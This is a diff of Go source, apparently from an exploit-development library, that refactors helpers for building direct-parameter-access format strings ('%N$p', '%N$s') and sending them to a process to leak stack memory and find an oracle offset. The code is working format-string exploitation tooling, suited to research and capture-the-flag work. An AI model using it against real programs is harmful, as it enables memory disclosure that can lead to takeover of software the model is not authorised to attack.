@@ -52,8 +52,8 @@ func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLea
 
 	return &FormatStringLeaker{
 		procIOFn:  config.ProcessIOFn,
-		builder:   dpaLeakConfig.builder.fmtStrBuilder,
-		formatStr: dpaLeakConfig.builder.build(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
+		builder:   dpaLeakConfig.builder,
+		formatStr: dpaLeakConfig.builder.buildDPA(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
 	}, nil
 }
 
@@ -66,22 +66,20 @@ func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (
 		return nil, err
 	}
 
-	dpaBuilder := dpaFormatStringBuilder{
-		fmtStrBuilder: formatStringBuilder{
-			prefixAndSuffix:  []byte("|"),
-			endOfStringDelim: []byte("foozlefu"),
-			pointerSize:      config.PointerSize,
-		},
+	fmtStrBuilder := formatStringBuilder{
+		prefixAndSuffix:  []byte("|"),
+		endOfStringDelim: []byte("foozlefu"),
+		pointerSize:      config.PointerSize,
 	}
 
 	specifier := []byte("p")
 	fmtStrBuff := bytes.NewBuffer(nil)
-	dpaBuilder.buildUnaligned(config.MaxNumParams, specifier, fmtStrBuff)
+	fmtStrBuilder.appendUnalignedDPA(config.MaxNumParams, specifier, fmtStrBuff)
 	memoryAlignedLen := stringMemoryAlignedLen(fmtStrBuff.Bytes(), config.PointerSize)
 
 	if config.Verbose != nil {
 		config.Verbose.Printf("format string config: %+v\nmemory aligned len: %d\nstring w/o padding: '%s'",
-			dpaBuilder, memoryAlignedLen, fmtStrBuff.Bytes())
+			fmtStrBuilder, memoryAlignedLen, fmtStrBuff.Bytes())
 	}
 
 	// TODO: Randomize oracle string instead of A's.
@@ -96,8 +94,8 @@ func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (
 	for ; i < config.MaxNumParams; i++ {
 		addressFromFormatFunc, err := leakDataWithFormatString(
 			config.ProcessIOFn(),
-			append(dpaBuilder.build(i, specifier, memoryAlignedLen), oracleBytes...),
-			dpaBuilder.fmtStrBuilder)
+			append(fmtStrBuilder.buildDPA(i, specifier, memoryAlignedLen), oracleBytes...),
+			fmtStrBuilder)
 		if err != nil {
 			return nil, err
 		}
@@ -106,7 +104,7 @@ func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (
 			return &dpaLeakConfig{
 				paramNum: i,
 				alignLen: memoryAlignedLen,
-				builder:  dpaBuilder,
+				builder:  fmtStrBuilder,
 			}, nil
 		}
 	}
@@ -117,11 +115,13 @@ func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (
 type dpaLeakConfig struct {
 	paramNum int
 	alignLen int
-	builder  dpaFormatStringBuilder
+	builder  formatStringBuilder
 }
 
-type dpaFormatStringBuilder struct {
-	fmtStrBuilder formatStringBuilder
+type formatStringBuilder struct {
+	prefixAndSuffix  []byte
+	endOfStringDelim []byte
+	pointerSize      int
 }
 
 // The resulting string is going to look like this:
@@ -131,31 +131,34 @@ type dpaFormatStringBuilder struct {
 // string parameter specifier. As it grows, it could
 // potentially mess up the alignment of the stack,
 // which will make finding the oracle very difficult.
-func (o dpaFormatStringBuilder) build(paramNumber int, specifiers []byte, alignmentLen int) []byte {
+func (o formatStringBuilder) buildDPA(paramNumber int, specifiers []byte, alignmentLen int) []byte {
 	temp := bytes.NewBuffer(nil)
-	o.buildUnaligned(paramNumber, specifiers, temp)
-	return o.fmtStrBuilder.build(alignmentLen, temp)
+	o.appendUnalignedDPA(paramNumber, specifiers, temp)
+	return o.build(alignmentLen, temp)
 }
 
-func (o dpaFormatStringBuilder) buildUnaligned(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
-	o.fmtStrBuilder.appendInitial(buff)
-	o.appendDirectParamAccessSpecifier(paramNumber, specifiers, buff)
-	o.fmtStrBuilder.appendEnd(buff)
-}
-
-func (o dpaFormatStringBuilder) appendDirectParamAccessSpecifier(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
+func (o formatStringBuilder) appendUnalignedDPA(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
+	o.appendPrefix(buff)
 	buff.WriteByte('%')
 	buff.WriteString(strconv.Itoa(paramNumber))
 	buff.WriteByte('$')
 	if len(specifiers) > 0 {
 		buff.Write(specifiers)
 	}
+	o.appendSuffix(buff)
 }
 
-type formatStringBuilder struct {
-	prefixAndSuffix  []byte
-	endOfStringDelim []byte
-	pointerSize      int
+func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
+	return prependStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
+}
+
+func (o formatStringBuilder) appendPrefix(buff *bytes.Buffer) {
+	buff.Write(o.prefixAndSuffix)
+}
+
+func (o formatStringBuilder) appendSuffix(buff *bytes.Buffer) {
+	buff.Write(o.prefixAndSuffix)
+	buff.Write(o.endOfStringDelim)
 }
 
 func (o formatStringBuilder) isSuitableForLeaking() error {
@@ -163,19 +166,6 @@ func (o formatStringBuilder) isSuitableForLeaking() error {
 		return fmt.Errorf("prefix and suffix field cannot be empty")
 	}
 	return nil
-}
-
-func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
-	return prependStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
-}
-
-func (o formatStringBuilder) appendInitial(buff *bytes.Buffer) {
-	buff.Write(o.prefixAndSuffix)
-}
-
-func (o formatStringBuilder) appendEnd(buff *bytes.Buffer) {
-	buff.Write(o.prefixAndSuffix)
-	buff.Write(o.endOfStringDelim)
 }
 
 type FormatStringLeaker struct {
@@ -214,27 +204,25 @@ func NewFormatStringDPALeaker(config FormatStringDPAConfig) (*FormatStringDPALea
 		return nil, err
 	}
 
-	dpaBuilder := dpaFormatStringBuilder{
-		fmtStrBuilder: formatStringBuilder{
-			prefixAndSuffix:  []byte("|"),
-			endOfStringDelim: []byte("foozlefu"),
-			pointerSize:      config.PointerSize,
-		},
+	fmtStrBuilder := formatStringBuilder{
+		prefixAndSuffix:  []byte("|"),
+		endOfStringDelim: []byte("foozlefu"),
+		pointerSize:      config.PointerSize,
 	}
 
 	unalignedBuff := bytes.NewBuffer(nil)
-	dpaBuilder.buildUnaligned(config.MaxNumParams, []byte("p"), unalignedBuff)
+	fmtStrBuilder.appendUnalignedDPA(config.MaxNumParams, []byte("p"), unalignedBuff)
 
 	return &FormatStringDPALeaker{
 		config:     config,
-		dpaBuilder: dpaBuilder,
+		builder:    fmtStrBuilder,
 		alignedLen: stringMemoryAlignedLen(unalignedBuff.Bytes(), config.PointerSize),
 	}, nil
 }
 
 type FormatStringDPALeaker struct {
 	config     FormatStringDPAConfig
-	dpaBuilder dpaFormatStringBuilder
+	builder    formatStringBuilder
 	alignedLen int
 }
 
@@ -286,11 +274,11 @@ func (o FormatStringDPALeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
 			paramNumber, o.config.MaxNumParams)
 	}
 
-	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.dpaBuilder.fmtStrBuilder)
+	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.builder)
 }
 
 func (o FormatStringDPALeaker) FormatString(paramNum int) []byte {
-	return o.dpaBuilder.build(paramNum, []byte{'p'}, o.alignedLen)
+	return o.builder.buildDPA(paramNum, []byte{'p'}, o.alignedLen)
 }
 
 func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringBuilder) ([]byte, error) {
